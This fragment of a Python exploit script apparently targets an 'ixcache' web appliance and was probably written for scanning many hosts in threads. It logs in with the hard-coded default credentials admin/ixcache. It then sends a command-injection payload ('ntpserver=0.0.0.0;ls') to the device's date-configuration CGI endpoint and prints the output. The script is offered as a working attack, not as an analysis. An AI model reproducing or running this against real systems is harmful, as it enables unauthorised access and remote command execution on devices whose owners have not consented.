...
def exploit(ip_, index):
    try:
        ...
        url = ip_+'/login/userverify.cgi'
        headers.update({'Origin':ip_})
        headers.update({'Referer':f'{ip_}/login/login.htm'})
        # print(index,url)
        payload={'username':'admin','password':'ixcache'}
...
def exp(ip_, index,cookie):
    try:

        url = ip_+'/cgi-bin/Maintain/date_config'
        # print(index,url)
        print(cookie)
        command='id'
        headers = {
        ...
        payload='ntpserver=0.0.0.0;ls&year=2021&month=08&day=14&hour=17&minute=04&second=50&tz=Asiz&bcy=Shanghai&ifname=fxp1'
        res = requests.post(url,data=payload, headers=headers, timeout=8, verify=False)
        print(res, len(res.text))
        print(res.text)
        # with result_path.open('a+') as file:
...
threads = []
# with open(r'D:\Downloads\tmp\ixcache.txt', 'r') as file:
